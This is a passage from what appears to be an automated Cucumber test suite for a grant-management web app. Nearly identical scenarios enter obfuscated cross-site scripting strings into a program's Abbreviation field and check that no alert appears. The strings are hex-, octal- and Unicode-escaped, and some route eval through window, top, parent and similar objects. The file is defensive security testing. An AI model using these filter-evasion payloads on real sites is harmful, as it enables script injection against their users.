    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301664 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | ';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301666 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                        | Field                |
      | ';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301667 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301669 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301670 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                             | Field                |
      | ';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301671 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';window['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301672 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | ';self['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301675 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | ';this['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301678 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | ';top['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301679 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';parent['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301681 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';frames['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301684 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';globalThis['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301685 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | ';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301687 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                             | Field                |
      | ';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301689 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                             | Field                |
      | ';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301690 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                            | Field                |
      | ';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301691 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
